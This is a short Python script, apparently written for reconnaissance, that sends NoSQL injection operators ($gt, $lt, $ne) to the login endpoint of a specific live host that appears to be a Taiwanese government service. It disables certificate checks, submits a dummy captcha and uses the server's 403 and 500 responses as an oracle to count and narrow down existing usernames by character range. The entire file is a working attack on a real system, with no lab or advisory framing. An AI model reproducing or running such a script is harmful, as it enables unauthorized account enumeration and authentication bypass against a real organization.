import requests, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code
def count(lo,hi):
    body={"username":{"$and":[{"$gt":lo},{"$lt":hi}]},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    return login(body)

print("=== 字符串区间二分 ($gt/$lt): 403=区间内>=2, 500=<=1 ===")
print(f"全范围 ''..~ -> {count('','~')}")
for lo,hi,tag in [("A","Z","大写A-Z"),("a","z","小写a-z"),("0","9","数字0-9"),("~","{","符号区")]:
    sc=count(lo,hi); time.sleep(0.05)
    print(f"  区间 {tag:10s} -> {sc}  {'<== >=2文档' if sc==403 else ''}")
